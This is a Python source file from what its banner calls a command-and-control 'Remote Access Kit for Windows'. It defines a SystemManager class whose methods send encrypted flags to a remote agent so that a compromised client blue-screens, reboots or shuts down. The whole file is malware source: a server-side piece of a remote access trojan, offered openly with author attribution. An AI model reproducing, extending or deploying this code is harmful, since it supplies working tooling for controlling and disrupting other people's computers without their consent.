#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.0
# -------------------------------------------------------------
from ..networking.socket import ServerSocket
from ..client_handling.flags import ClientActionFlags

class SystemManager:

    #Function tells agent to blue screen the computer
    def force_blue_screen(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().blue_screen}{ClientActionFlags().seperator} ') #Send blue screen flag to client

    #Function tells agent to reboot the client
    def reboot_client_system(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().reboot_computer}{ClientActionFlags().seperator} ')  #Send reboot flag to client

    #Function tells agent to shutdown the client
    def shutdown_client_system(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().shutdown_computer}{ClientActionFlags().seperator} ')  #Send shutdown flag to client